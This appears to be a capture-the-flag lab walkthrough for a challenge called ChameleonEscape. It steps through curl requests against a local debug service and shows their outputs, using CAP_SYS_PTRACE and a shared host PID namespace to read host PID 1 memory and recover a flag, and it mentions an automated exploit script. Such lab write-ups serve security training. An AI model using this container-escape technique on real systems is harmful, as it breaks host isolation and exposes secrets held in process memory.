# Walkthrough: ChameleonEscape

## Setup

```bash
docker compose up --build
```

Confirm the service is running:

```bash
curl http://localhost:8080/
```

Output:
```json
{
  "service": "ChameleonDebugger v1.4",
  "description": "In-container process performance monitor"
}
```

## Step 1: Read Container Capabilities

```bash
curl http://localhost:8080/api/caps
```

Output:
```json
{
  "CapEff": "0000000000400000",
  "decoded": ["CAP_SYS_PTRACE"]
}
```

The container has `CAP_SYS_PTRACE`. Bit 19 in the effective mask: the container can
attach to any process it can see.

## Step 2: List Visible Processes

```bash
curl http://localhost:8080/api/processes
```

The process list includes host processes (marked `"host": true`). PID 1 is systemd
on the host. Reachable via ptrace because the container shares the host PID namespace.

## Step 3: Read PID 1's Memory Map

```bash
curl http://localhost:8080/api/process/1/maps
```

Find the `[mmap anon]` segment. Its start address is the read target.

## Step 4: Read the Flag from Host Memory

```bash
curl "http://localhost:8080/api/process/1/mem?addr=0x7f4000500000&size=64"
```

Output:
```json
{
  "pid": 1,
  "addr": "0x7f4000500000",
  "data": "POC{...}",
  "note": "Host process memory read via CAP_SYS_PTRACE + /proc/1/mem"
}
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

The script runs all four steps in sequence and prints the flag.
